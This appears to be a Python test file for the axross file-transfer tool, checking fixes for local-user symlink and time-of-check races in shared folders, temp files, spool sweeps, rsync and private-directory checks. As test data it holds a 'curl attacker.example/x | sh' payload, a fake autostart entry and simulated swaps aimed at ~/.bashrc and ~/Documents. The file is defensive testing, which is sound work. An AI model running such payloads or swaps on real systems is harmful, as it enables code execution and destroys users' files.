"""Local-user races around files axross writes (review round 9, supply).

Measured before (/root/pt-rev9-sec/supply):

* Resume in a group-shared, non-sticky download folder: another member
  swapped the claimed partial's name for a symlink to ~/.bashrc between the
  no-replace claim and the open; the compare failed, the copy restarted at
  0 and ``LocalFS.open_write`` (``open(path, "wb")``) truncated ~/.bashrc and
  wrote the download into it ("OVERWRITTEN WITH DOWNLOAD: True").
* A fresh copy of a 0600 key was created 0644 and chmod-ed by name, then
  reopened by name: a descriptor opened in that window read the key later,
  and a link swapped in took the chmod and the bytes. atomic_io's temp files
  had the same window.
* The stale-spool sweep listed and unlinked a spool folder BY PATH after its
  lstat: swapped for a link to ~/Documents, it emptied ~/Documents.
* rsync downloaded into a folder made in the shared destination folder, by
  name: renamed away and replaced by a link, the download landed in
  ~/.config/autostart.
* private_dir_problem never looked at who owns a symlink on the way to a
  private folder, nor at the folder holding a second hop, nor at ACLs.

Now the local temp file is created exclusively (0600, then its mode through
the descriptor) or the partial opened once with O_NOFOLLOW and checked
(regular, own, one link, the compared size), and written through that one
descriptor; the name must still be that file before the rename. The sweep
works through the folder's descriptor; rsync gets a private folder when the
destination is shared; private_dir_problem resolves the path component by
component.
"""

from __future__ import annotations

import os
import stat
import struct
import sys
import tempfile
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

from core import atomic_io, read_spool, server_ops  # noqa: E402
from core import self_update as SU  # noqa: E402
from core import transfer_worker as TW  # noqa: E402
from core.local_fs import LocalFS  # noqa: E402
from core.transfer_worker import TransferJob, TransferStatus, TransferWorker  # noqa: E402

posix_only = pytest.mark.skipif(os.name != "posix", reason="POSIX modes, links and descriptors")
KIB = 1024
DAY = 24 * 3600


@pytest.fixture(autouse=True)
def _journal(tmp_path, monkeypatch):
    monkeypatch.setenv("AXROSS_OPERATION_JOURNAL", str(tmp_path / "ops.jsonl"))


def _job(src: Path, dest: Path, **kw) -> TransferJob:
    st = src.stat()
    job = TransferJob(source_path=str(src), dest_path=str(dest), filename=src.name,
                      total_bytes=st.st_size, source_mtime=st.st_mtime,
                      source_mode=st.st_mode, **kw)
    job.source_backend = LocalFS()
    job.dest_backend = LocalFS()
    return job


def _shared_resume(tmp_path: Path, data: bytes):
    """A source, a group-shared download folder with a planted idle partial
    of it, and the victim's ~/.bashrc."""
    share = tmp_path / "share"
    share.mkdir()
    share.chmod(0o777)
    bashrc = tmp_path / "home" / ".bashrc"
    bashrc.parent.mkdir()
    bashrc.write_text("# the victim's bashrc\n")
    src = tmp_path / "src" / "tool.sh"
    src.parent.mkdir()
    src.write_bytes(data)
    fp = TW.source_fingerprint(LocalFS().stat(str(src)))
    planted = share / TW.partial_name("tool.sh", "deadbeef", fp)
    planted.write_bytes(b"x" * 1000)
    old = time.time() - 3600
    os.utime(planted, (old, old))
    return share, bashrc, src, planted, fp


# -- M4: the claimed partial -------------------------------------------------------


@posix_only
def test_sad_a_claimed_partial_swapped_for_a_link_is_never_written_through(tmp_path, monkeypatch):
    """The other user swaps the claimed name for a symlink to ~/.bashrc right
    after the claim: the download never goes through the link."""
    data = b"curl attacker.example/x | sh\n" + b"#" * (300 * KIB)
    share, bashrc, src, planted, fp = _shared_resume(tmp_path, data)
    real = server_ops.rename_no_replace

    def claim_then_swap(backend, old, new):
        real(backend, old, new)
        os.unlink(new)
        os.symlink(bashrc, new)

    monkeypatch.setattr(server_ops, "rename_no_replace", claim_then_swap)
    job = _job(src, share / "tool.sh", resume=True, temp_path=str(planted),
               source_fingerprint=fp)
    TransferWorker()._process_job(job)
    assert bashrc.read_text() == "# the victim's bashrc\n"
    dest = share / "tool.sh"
    assert not dest.is_symlink()
    if job.status is TransferStatus.DONE:
        assert dest.read_bytes() == data


@posix_only
def test_sad_a_partial_swapped_after_the_compare_is_not_appended_to(tmp_path, monkeypatch):
    """The partial matched the source; then its name became a link to a file
    of the user's that holds the same head: nothing is appended to that."""
    data = os.urandom(400 * KIB)
    share, _bashrc, src, planted, fp = _shared_resume(tmp_path, data)
    planted.write_bytes(data[:1000])
    os.utime(planted, (time.time() - 3600,) * 2)
    victim = tmp_path / "home" / "notes.txt"
    victim.write_bytes(data[:1000])

    def matches_then_swap(src_handle, dest_backend, temp_path, offset):
        os.unlink(temp_path)
        os.symlink(victim, temp_path)
        return True

    monkeypatch.setattr(TransferWorker, "_partial_matches_source", staticmethod(matches_then_swap))
    job = _job(src, share / "tool.sh", resume=True, temp_path=str(planted),
               source_fingerprint=fp)
    TransferWorker()._process_job(job)
    assert victim.read_bytes() == data[:1000]
    assert job.status is TransferStatus.DONE, job.error_message
    assert (share / "tool.sh").read_bytes() == data and not (share / "tool.sh").is_symlink()


@posix_only
def test_sad_a_fresh_temp_swapped_for_a_link_is_not_committed(tmp_path, monkeypatch):
    """Swapped right after its creation: the bytes go into the file created
    (not the link's target) and the link is never renamed into place."""
    share = tmp_path / "share"
    share.mkdir()
    share.chmod(0o777)
    victim = tmp_path / "home" / ".profile"
    victim.parent.mkdir()
    victim.write_text("victim profile\n")
    src = tmp_path / "id_ed25519"
    src.write_bytes(b"-----BEGIN KEY-----\n" * 500)
    src.chmod(0o600)
    real = TW.create_private_file

    def create_then_swap(path, mode=None):
        fh = real(path, mode)
        os.unlink(path)
        os.symlink(victim, path)
        return fh

    monkeypatch.setattr(TW, "create_private_file", create_then_swap)
    job = _job(src, share / "id_ed25519")
    TransferWorker()._process_job(job)
    assert job.status is TransferStatus.ERROR
    assert victim.read_text() == "victim profile\n"
    assert not os.path.lexists(share / "id_ed25519")


@posix_only
def test_happy_a_private_copy_is_created_with_its_mode_and_never_chmod_ed_by_name(
        tmp_path, monkeypatch):
    """A 0600 key: the temp file is 0600 from its creation (no 0644 window to
    open it in), and no chmod by name (which follows a swapped-in link)."""
    src = tmp_path / "key"
    src.write_bytes(b"secret\n" * 1000)
    src.chmod(0o600)
    (tmp_path / "out").mkdir()
    chmods: list[str] = []
    real_chmod = os.chmod

    def recording(path, *a, **kw):
        chmods.append(os.fspath(path))
        return real_chmod(path, *a, **kw)

    monkeypatch.setattr(os, "chmod", recording)
    job = _job(src, tmp_path / "out" / "key")
    TransferWorker()._process_job(job)
    assert job.status is TransferStatus.DONE, job.error_message
    assert (tmp_path / "out" / "key").read_bytes() == src.read_bytes()
    assert (tmp_path / "out" / "key").stat().st_mode & 0o777 == 0o600
    assert not [p for p in chmods if TW.PARTIAL_MARK in p]


@posix_only
def test_happy_a_resume_appends_through_the_checked_descriptor(tmp_path):
    data = os.urandom(600 * KIB)
    src = tmp_path / "f.bin"
    src.write_bytes(data)
    src.chmod(0o640)
    (tmp_path / "out").mkdir()
    fp = TW.source_fingerprint(LocalFS().stat(str(src)))
    left = tmp_path / "out" / TW.partial_name("f.bin", "0123abcd", fp)
    left.write_bytes(data[: 200 * KIB])
    job = _job(src, tmp_path / "out" / "f.bin", resume=True, temp_path=str(left),
               source_fingerprint=fp)
    TransferWorker()._process_job(job)
    assert job.status is TransferStatus.DONE, job.error_message
    out = tmp_path / "out" / "f.bin"
    assert out.read_bytes() == data
    assert out.stat().st_mode & 0o777 == 0o640 & ~TW.process_umask()


@posix_only
def test_edge_open_own_partial_refuses_links_pipes_hard_links_and_changed_sizes(tmp_path):
    from core.local_fs import open_own_partial

    good = tmp_path / "good"
    good.write_bytes(b"abc")
    with open_own_partial(str(good), expect_size=3) as fh:
        fh.write(b"def")
    assert good.read_bytes() == b"abcdef"
    target = tmp_path / "target"
    target.write_bytes(b"keep")
    link = tmp_path / "link"
    link.symlink_to(target)
    fifo = tmp_path / "fifo"
    os.mkfifo(fifo)
    hard = tmp_path / "hard"
    os.link(target, hard)
    for path, size in ((link, None), (fifo, None), (hard, None), (good, 3)):
        with pytest.raises(PermissionError):
            open_own_partial(str(path), expect_size=size)  # a FIFO does not block either
    assert target.read_bytes() == b"keep"


@posix_only
def test_edge_create_private_file_is_exclusive_and_never_wider_than_its_mode(tmp_path):
    from core.local_fs import create_private_file

    path = tmp_path / "new"
    with create_private_file(str(path), 0o600) as fh:
        assert stat.S_IMODE(os.fstat(fh.fileno()).st_mode) == 0o600
        fh.write(b"x")
    target = tmp_path / "target"
    target.write_bytes(b"keep")
    link = tmp_path / "link"
    link.symlink_to(target)
    with pytest.raises(FileExistsError):
        create_private_file(str(link), 0o644)
    assert target.read_bytes() == b"keep"


def test_edge_a_subclass_with_its_own_open_write_keeps_it():
    class Redirecting(LocalFS):
        def open_write(self, path, append=False):
            return super().open_write(path, append)

    assert LocalFS().private_writes() and not Redirecting().private_writes()
    assert not TW._private_local(object())


# -- atomic_io's temp file ---------------------------------------------------------


@posix_only
def test_happy_atomic_write_never_chmods_its_temp_file_by_name(tmp_path, monkeypatch):
    target = tmp_path / "token"
    target.write_bytes(b"old")
    target.chmod(0o600)
    chmods: list[str] = []
    real_chmod = os.chmod

    def recording(path, *a, **kw):
        chmods.append(os.fspath(path))
        return real_chmod(path, *a, **kw)

    monkeypatch.setattr(os, "chmod", recording)
    atomic_io.atomic_write(LocalFS(), str(target), b"new secret")
    assert target.read_bytes() == b"new secret"
    assert target.stat().st_mode & 0o777 == 0o600
    assert not [p for p in chmods if ".tmp-" in p]


@posix_only
def test_sad_atomic_write_stream_does_not_rename_a_swapped_temp_into_place(tmp_path):
    folder = tmp_path / "shared"
    folder.mkdir()
    folder.chmod(0o777)
    target = folder / "settings.json"
    target.write_bytes(b"old")
    victim = tmp_path / "victim"
    victim.write_bytes(b"victim")

    class SwappingReader:
        done = False

        def read(self, n):
            if self.done:
                return b""
            self.done = True
            for p in folder.iterdir():
                if p.name.startswith(".tmp-"):
                    os.unlink(p)
                    os.symlink(victim, p)
            return b"new"

    with pytest.raises(OSError):
        atomic_io.atomic_write_stream(LocalFS(), str(target), SwappingReader())
    assert not target.is_symlink() and target.read_bytes() == b"old"
    assert victim.read_bytes() == b"victim"
    assert [p.name for p in folder.iterdir()] == ["settings.json"]


# -- read_spool: the stale-spool sweep and rsync's folder --------------------------


def _aged(path: Path, days: float = 3) -> Path:
    then = time.time() - days * DAY
    os.utime(path, (then, then), follow_symlinks=False)
    return path


@posix_only
def test_sad_a_stale_spool_folder_swapped_for_a_link_is_not_emptied(tmp_path, monkeypatch):
    share = tmp_path / "share"
    share.mkdir()
    share.chmod(0o777)
    documents = tmp_path / "home" / "Documents"
    documents.mkdir(parents=True)
    for name in ("thesis.odt", "taxes.pdf"):
        (documents / name).write_text(name)
        _aged(documents / name)
    stale = share / ".axross-spool-rsync-abc123"
    stale.mkdir()
    (stale / "x").write_text("old")
    _aged(stale / "x")
    _aged(stale)
    real_lstat = os.lstat

    def lstat_then_swap(path, *a, **kw):
        st = real_lstat(path, *a, **kw)
        if os.fspath(path) == str(stale) and not (share / "moved-away").exists():
            os.rename(stale, share / "moved-away")
            os.symlink(documents, stale)
        return st

    monkeypatch.setattr(os, "lstat", lstat_then_swap)
    read_spool.sweep_stale_spools(str(share))
    monkeypatch.setattr(os, "lstat", real_lstat)
    assert sorted(p.name for p in documents.iterdir()) == ["taxes.pdf", "thesis.odt"]


@posix_only
def test_edge_a_stale_spool_folder_replaced_by_another_folder_stays(tmp_path, monkeypatch):
    stale = tmp_path / ".axross-spool-rsync-abc123"
    stale.mkdir()
    (stale / "x").write_text("old")
    _aged(stale / "x")
    _aged(stale)
    other = tmp_path / "other"
    other.mkdir()
    (other / "kept").write_text("kept")
    _aged(other / "kept")
    real_lstat = os.lstat

    def lstat_then_replace(path, *a, **kw):
        st = real_lstat(path, *a, **kw)
        if os.fspath(path) == str(stale) and not (tmp_path / "gone").exists():
            os.rename(stale, tmp_path / "gone")
            os.rename(other, stale)
        return st

    monkeypatch.setattr(os, "lstat", lstat_then_replace)
    assert read_spool.sweep_stale_spools(str(tmp_path)) == 0
    monkeypatch.setattr(os, "lstat", real_lstat)
    assert (stale / "kept").read_text() == "kept"


@posix_only
def test_sad_rsync_downloads_into_a_private_folder_not_the_shared_destination(
        tmp_path, monkeypatch):
    from core import rsync_client as RC
    from core import transfer_hooks

    monkeypatch.setenv("XDG_CACHE_HOME", str(tmp_path / "cache"))
    share = tmp_path / "share"
    share.mkdir()
    share.chmod(0o777)
    autostart = tmp_path / "home" / ".config" / "autostart"
    autostart.mkdir(parents=True)
    real_mkdtemp = tempfile.mkdtemp
    used: list[str] = []

    def mkdtemp(*a, **kw):
        made = real_mkdtemp(*a, **kw)
        used.append(made)
        if kw.get("dir") == str(share):  # the other user wins the race
            os.rename(made, made + ".gone")
            os.symlink(autostart, made)
        return made

    session = RC.RsyncSession.__new__(RC.RsyncSession)
    session._build_url = lambda p: "rsync://srv/mod" + p

    def fake_rsync(args, timeout=None):
        url, dest = args[-2], args[-1]
        with open(dest + url.rsplit("/", 1)[-1], "wb") as fh:  # by name, as rsync does
            fh.write(b"[Desktop Entry]\nExec=evil\n")

    session._run_rsync = fake_rsync
    monkeypatch.setattr(tempfile, "mkdtemp", mkdtemp)

    class Hooks:
        spool_dir = str(share)

    with transfer_hooks.active(Hooks()):
        try:
            session.open_read("/pub/evil.desktop").close()
        except OSError:
            pass
    assert sorted(os.listdir(autostart)) == []
    assert used and not any(Path(u).parent == share for u in used)


@posix_only
def test_edge_others_may_replace_in_tells_shared_from_private_folders(tmp_path):
    cases = {0o700: False, 0o755: False, 0o777: True, 0o1777: False}
    for mode, shared in cases.items():
        folder = tmp_path / oct(mode)
        folder.mkdir()
        folder.chmod(mode)
        assert read_spool.others_may_replace_in(str(folder)) is shared, oct(mode)


# -- private_dir_problem: the way to a private folder ------------------------------


@posix_only
def test_sad_another_users_symlink_in_front_of_a_private_folder_is_refused(tmp_path, monkeypatch):
    """XDG_DATA_HOME in a sticky /tmp, its name another user's link to the
    victim's ~/.local/share: every check saw the victim's folder."""
    share = tmp_path / "home" / ".local" / "share"
    share.mkdir(parents=True)
    tmp = tmp_path / "tmp"
    tmp.mkdir()
    tmp.chmod(0o1777)
    link = tmp / "alice-data"
    link.symlink_to(share)
    folder = link / "axross" / "update"
    assert SU.private_dir_problem(folder) == ""  # the user's own link: fine
    real_lstat = os.lstat

    class Foreign:
        def __init__(self, st):
            self._st = st

        def __getattr__(self, name):
            return 65534 if name == "st_uid" else getattr(self._st, name)

    def lstat(path, *a, **kw):
        st = real_lstat(path, *a, **kw)
        return Foreign(st) if os.path.abspath(path) == str(link) else st

    monkeypatch.setattr(os, "lstat", lstat)
    assert "symbolic link of another user" in SU.private_dir_problem(folder, create=False)


@posix_only
def test_sad_a_second_hop_through_a_world_writable_folder_is_refused(tmp_path):
    """~/.cache -> w/hop -> p/c with w 0777 non-sticky: hop can be replaced."""
    w = tmp_path / "w"
    w.mkdir()
    w.chmod(0o777)
    real = tmp_path / "p" / "c" / "axross" / "update"
    real.mkdir(parents=True)
    for q in (tmp_path / "p", tmp_path / "p" / "c", real.parent, real):
        q.chmod(0o700)
    (w / "hop").symlink_to(tmp_path / "p" / "c")
    home = tmp_path / "home"
    home.mkdir(mode=0o700)
    (home / ".cache").symlink_to(w / "hop")
    problem = SU.private_dir_problem(home / ".cache" / "axross" / "update", create=False)
    assert f"{w} can be changed by other users" in problem


@posix_only
def test_sad_a_parent_whose_acl_lets_another_user_write_is_refused(tmp_path):
    folder = tmp_path / "cache" / "axross" / "update"
    folder.mkdir(parents=True)
    for q in (tmp_path / "cache", folder.parent, folder):
        q.chmod(0o700)
    acl = struct.pack("<I", 2) + b"".join(struct.pack("<HHI", *e) for e in (
        (0x01, 7, 0xFFFFFFFF), (0x02, 7, 65534), (0x04, 0, 0xFFFFFFFF), (0x10, 7, 0xFFFFFFFF),
        (0x20, 0, 0xFFFFFFFF)))
    try:
        os.setxattr(folder.parent, "system.posix_acl_access", acl)
    except (OSError, AttributeError) as exc:
        pytest.skip(f"no POSIX ACLs here: {exc}")
    if os.stat(folder.parent).st_mode & 0o070 != 0o070:
        pytest.skip("the ACL's mask did not land in the group bits")
    os.chmod(folder.parent, 0o770)  # what the mask shows; the group is the user's own
    if not SU._private_group(os.stat(folder.parent).st_gid, os.geteuid()):
        pytest.skip("the folder's group is not this user's private group here")
    problem = SU.private_dir_problem(folder, create=False)
    assert f"{folder.parent} can be changed by other users" in problem
